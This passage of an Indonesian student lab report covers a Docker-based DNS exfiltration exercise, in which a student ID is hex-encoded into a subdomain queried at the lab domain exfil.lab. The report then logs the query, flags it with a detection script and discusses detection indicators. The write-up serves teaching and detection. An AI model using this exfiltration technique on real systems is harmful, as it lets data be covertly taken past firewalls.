sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131313331.k5.exfil.lab @dns
```

Hasil:

```text
10.0.0.99
```

**4. Menyimpan log DNS**

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k5.log
```

**5. Menganalisis log DNS**

```bash
python3 01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py dns-k5.log
```

**6. Mengubah kembali hexadecimal menjadi teks**

```bash
echo 3234353532303131313331 | xxd -r -p
```

Hasil:

```text
24552011131
```

**7. Membersihkan lingkungan praktikum**

```bash
sudo docker compose -p k5 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
```

## 3. Hasil Pengujian

Berdasarkan pengujian yang dilakukan, NIM berhasil dikonversi ke format hexadecimal dan digunakan sebagai bagian dari subdomain DNS.

Query yang dikirim adalah:

```text
3234353532303131313331.k5.exfil.lab
```

DNS memberikan respons berupa alamat IP berikut:

```text
10.0.0.99
```

Selanjutnya, log DNS berhasil disimpan dan dianalisis menggunakan script `analisis_dns.py`.

Hasil analisis menunjukkan satu query di bawah domain induk `exfil.lab` yang ditandai sebagai aktivitas mencurigakan.

Setelah dilakukan proses decoding hexadecimal, data kembali menjadi:

```text
24552011131
```

Hasil tersebut sesuai dengan NIM yang digunakan selama praktikum. Dengan demikian, proses konversi data, pengiriman query DNS, pencatatan log, dan decoding berhasil diamati.

## 4. Bukti Screenshot

**Gambar 33.** Proses menjalankan service DNS dan container attacker menggunakan Docker Compose sebagai persiapan simulasi DNS Exfiltration.

![Gambar 33](https://github.com/user-attachments/assets/4acfb09d-ad7c-497a-bab8-6defb9530827)

**Gambar 34.** Proses mengubah NIM menjadi format hexadecimal menggunakan perintah `xxd`. Hasil konversi digunakan sebagai bagian dari subdomain pada query DNS.

![Gambar 34](https://github.com/user-attachments/assets/6468316d-123a-4ce9-bc0c-71b212b9fda3)

**Gambar 35.** Proses mengirim query DNS yang berisi data hexadecimal menuju server DNS. Hasil pengujian menunjukkan respons berupa alamat IP `10.0.0.99`.

![Gambar 35](https://github.com/user-attachments/assets/d3547057-6e0b-44b1-814e-caeea1f3e83c)

**Gambar 36.** Proses menyimpan log DNS dan melakukan decoding terhadap data hexadecimal untuk mengembalikan data ke bentuk teks semula.

![Gambar 36](https://github.com/user-attachments/assets/300e321e-84bd-414d-8c35-655429fde608)

**Gambar 37.** Hasil analisis log DNS menggunakan script `analisis_dns.py`. Pada hasil tersebut ditemukan satu query yang ditandai sebagai aktivitas mencurigakan.

![Gambar 37](https://github.com/user-attachments/assets/888421d8-6438-4afa-997b-da1f85f8f111)

**Gambar 38.** Hasil verifikasi decoding hexadecimal yang menunjukkan bahwa data berhasil dikembalikan menjadi NIM `24552011131`.

![Gambar 38](https://github.com/user-attachments/assets/02a9fab0-d0bf-4d70-ad87-a9fb43c2634d)

**Gambar 39.** Proses menghentikan dan membersihkan container serta jaringan praktikum setelah seluruh pengujian DNS Exfiltration selesai dilakukan.

![Gambar 39](https://github.com/user-attachments/assets/3b532449-5179-48d7-b03c-ae8655fdcfa7)

## 5. Pembahasan DNS Exfiltration

### a. Mengapa DNS Exfiltration Sulit Diblokir oleh Firewall Biasa?

DNS Exfiltration memanfaatkan protokol DNS yang umumnya diizinkan oleh firewall untuk kebutuhan resolusi nama domain.

Karena lalu lintas DNS dapat terlihat seperti permintaan domain biasa, aktivitas pengiriman data menjadi lebih sulit dibedakan apabila firewall hanya melakukan penyaringan berdasarkan alamat IP atau nomor port.

Oleh karena itu, pemeriksaan terhadap pola query DNS juga diperlukan untuk membantu menemukan aktivitas yang tidak biasa.

### b. Indikator Deteksi

Beberapa indikator yang dapat digunakan untuk mendeteksi DNS Exfiltration antara lain:

- Panjang label subdomain yang tidak biasa.
- Subdomain yang berisi karakter hexadecimal atau pola acak.
- Frekuensi query yang tinggi menuju domain tertentu.
- Pola query yang tidak sesuai dengan aktivitas DNS normal.

Selain indikator tersebut, analisis panjang label dan entropi juga dapat membantu mengidentifikasi pola permintaan DNS yang mencurigakan.

## 6. Kesimpulan

Berdasarkan praktikum yang telah dilakukan, DNS Exfiltration merupakan teknik penyalahgunaan protokol DNS untuk mengirimkan data melalui query DNS.

Pada pengujian ini, NIM berhasil dikonversi menjadi hexadecimal, digunakan sebagai bagian dari query DNS, dicatat dalam log, kemudian dikembalikan melalui proses decoding.

Melalui kegiatan ini, saya memahami bahwa analisis log DNS dapat membantu menemukan aktivitas yang tidak biasa dan menjadi salah satu langkah dalam mendeteksi kemungkinan kebocoran data melalui protokol DNS.

---

# C. KESIMPULAN AKHIR

Berdasarkan seluruh kegiatan praktikum UTS Kasus 5 dari Pertemuan 1 sampai Pertemuan 7, terdapat tujuh materi keamanan jaringan yang telah dipelajari dan diuji dalam lingkungan laboratorium.

Berikut merupakan rangkuman hasil dari setiap tugas:

1. **Docker dan Volume:** Memahami penyimpanan data secara persisten menggunakan Docker Volume serta menguji komunikasi antarcontainer menggunakan Docker Compose.
2. **Kriptografi:** Memahami proses enkripsi dan dekripsi AES-256-CBC, pemeriksaan integritas menggunakan SHA-256, serta pembuatan sertifikat digital menggunakan OpenSSL.
3. **ARP Spoofing:** Memahami perubahan pemetaan IP dan MAC Address pada tabel ARP serta mempelajari mitigasi menggunakan Static ARP.
4. **Analisis WPA2 Handshake:** Memahami konsep autentikasi WPA2 dan melakukan pemeriksaan file capture menggunakan Aircrack-ng. Namun, proses pencocokan wordlist belum dapat dilakukan karena file capture tidak berhasil dibaca sebagai capture 802.11 yang valid.
5. **ICMP dengan Scapy:** Memahami proses pengiriman ICMP Echo Request dan penerimaan Echo Reply menggunakan Scapy.
6. **SYN Flood:** Memahami proses TCP Three-Way Handshake serta mengamati perubahan koneksi setengah terbuka selama simulasi SYN Flood.
7. **DNS Exfiltration:** Memahami pengiriman data melalui query DNS, proses konversi hexadecimal, dan analisis log untuk mendeteksi aktivitas DNS yang mencurigakan.

Secara keseluruhan, kegiatan praktikum ini memberikan pengalaman dalam menggunakan beberapa tools keamanan jaringan dan melakukan pengujian secara langsung melalui lingkungan Docker.

Dari setiap kegiatan, saya memperoleh pemahaman bahwa keamanan jaringan tidak hanya berkaitan dengan cara kerja suatu protokol, tetapi juga bagaimana protokol tersebut dapat disalahgunakan dan bagaimana langkah pencegahan dapat diterapkan.

Seluruh hasil pengujian dan pembahasan dalam laporan ini disusun berdasarkan proses pengerjaan serta keluaran terminal yang diperoleh selama praktikum.

**Repository GitHub:**

https://github.com/Baadizlniii/UTS-Network-Security-Putra-Baadi-Zaelani
